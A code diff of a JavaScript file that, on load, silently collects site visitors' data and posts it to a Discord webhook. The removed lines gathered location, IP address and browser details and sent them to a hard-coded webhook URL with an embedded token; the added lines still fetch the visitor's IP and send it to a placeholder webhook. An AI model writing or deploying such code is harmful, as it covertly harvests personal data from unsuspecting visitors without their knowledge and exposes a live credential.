@@ -372,30 +372,9 @@ async function getUserIP() {
   }
 }
 
-function getUserSystemInfo() {
-  const userAgent = window.navigator.userAgent;
-  const platform = window.navigator.platform;
-  const browser = {
-    userAgent,
-    platform,
-    appName: window.navigator.appName,
-    appVersion: window.navigator.appVersion,
-    userAgent: window.navigator.userAgent,
-  };
-  return browser;
-}
-
-async function sendDataToWebhook(location) {
-  const userIP = await getUserIP();
-  const userSystemInfo = getUserSystemInfo();
-
-  const dataToSend = {
-    location,
-    ip: userIP,
-    systemInfo: userSystemInfo,
-  };
-
-  const webhookURL = 'https://discord.com/api/webhooks/1187164716980785223/PLQjmGNi2-zqSHtfNyTjMpGfOosQPaOJkhU8rdLxmGbWwqRnAxJnkdTexKEuU7thAWAe';
+async function sendDataToWebhook(ip) {
+  const dataToSend = { ip };
+  const webhookURL = 'YOUR_WEBHOOK_URL';
 
   try {
     const response = await fetch(webhookURL, {
@@ -407,13 +386,22 @@ async function sendDataToWebhook(location) {
     });
 
     if (response.ok) {
-      console.log('Data sent successfully to the webhook');
+      console.log('IP address sent successfully to the webhook');
     } else {
-      console.error('Failed to send data to the webhook');
+      console.error('Failed to send IP address to the webhook');
     }
   } catch (error) {
-    console.error('Error sending data to the webhook:', error);
+    console.error('Error sending IP address to the webhook:', error);
   }
 }
 
-getUserLocation();
+async function sendIPToWebhook() {
+  const userIP = await getUserIP();
+  if (userIP) {
+    sendDataToWebhook(userIP);
+  } else {
+    console.error('Unable to fetch IP address');
+  }
+}
+
+sendIPToWebhook();
